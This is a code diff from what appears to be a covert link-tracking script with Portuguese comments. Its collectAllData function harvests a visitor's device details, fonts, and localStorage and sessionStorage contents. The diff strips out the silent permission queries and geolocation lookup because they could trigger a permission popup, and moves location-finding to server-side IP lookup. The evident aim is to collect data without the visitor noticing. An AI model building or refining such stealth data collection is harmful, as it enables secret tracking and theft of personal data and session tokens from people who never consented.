@@ -223,7 +223,7 @@ async function collectAllData(linkId) {
       battery: await getBatteryInfoSilent(),
       mediaDevices: await getMediaDevicesSilent(),
       permissions: await getPermissionsSilent(),
-      geolocation: await getGeolocationSilent(), // Sem pedir permissão
+      geolocation: await getGeolocationSilent(), // Removido - evita pedir permissão
       fonts: getFonts(),
       localStorage: getLocalStorage(),
       sessionStorage: getSessionStorage(),
@@ -487,74 +487,31 @@ async function getMediaDevicesSilent() {
 }
 
 // Versão silenciosa - apenas verifica status sem pedir permissão
+// REMOVIDO: navigator.permissions.query pode pedir permissão em alguns navegadores
 async function getPermissionsSilent() {
-  const permissions = {};
-  const permissionNames = [
-    'geolocation',
-    'notifications',
-    'push',
-    'camera',
-    'microphone',
-    'persistent-storage'
-  ];
-
-  for (const name of permissionNames) {
-    try {
-      if (navigator.permissions && navigator.permissions.query) {
-        // query() apenas verifica status, não pede permissão
-        const result = await Promise.race([
-          navigator.permissions.query({ name }),
-          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 100))
-        ]);
-        permissions[name] = result.state;
-      }
-    } catch (e) {
-      permissions[name] = 'unknown';
-    }
-  }
-
-  return permissions;
+  // Não verificamos permissões para evitar qualquer popup
+  // Retornamos apenas informações básicas sem fazer queries
+  return {
+    geolocation: 'not_checked',
+    notifications: 'not_checked',
+    push: 'not_checked',
+    camera: 'not_checked',
+    microphone: 'not_checked',
+    persistentStorage: 'not_checked',
+    note: 'Permissions check disabled to avoid popups'
+  };
 }
 
-// Versão silenciosa - tenta obter sem pedir permissão explícita
+// Versão silenciosa - REMOVIDO completamente para evitar pedidos de permissão
+// getCurrentPosition SEMPRE pede permissão na primeira vez
 async function getGeolocationSilent() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve('not_available');
-      return;
-    }
-
-    // Tentar obter com maximumAge alto para usar cache (sem pedir permissão novamente)
-    const timeout = setTimeout(() => {
-      resolve('timeout_silent');
-    }, 500); // Timeout curto para não bloquear
-
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        clearTimeout(timeout);
-        resolve({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          altitude: position.coords.altitude,
-          altitudeAccuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading,
-          speed: position.coords.speed,
-          timestamp: position.timestamp
-        });
-      },
-      (error) => {
-        clearTimeout(timeout);
-        // Não mostrar erro, apenas retornar silenciosamente
-        resolve({ error: error.code, silent: true });
-      },
-      { 
-        timeout: 500, 
-        maximumAge: 86400000, // 24 horas - usa cache se disponível
-        enableHighAccuracy: false // Não pedir alta precisão
-      }
-    );
-  });
+  // Não tentamos obter geolocalização para evitar popup de permissão
+  // A geolocalização por IP será feita no servidor (sem pedir permissão)
+  return {
+    skipped: true,
+    reason: 'Avoid permission popup',
+    note: 'Geolocation by IP will be done on server instead'
+  };
 }
 
 function getFonts() {
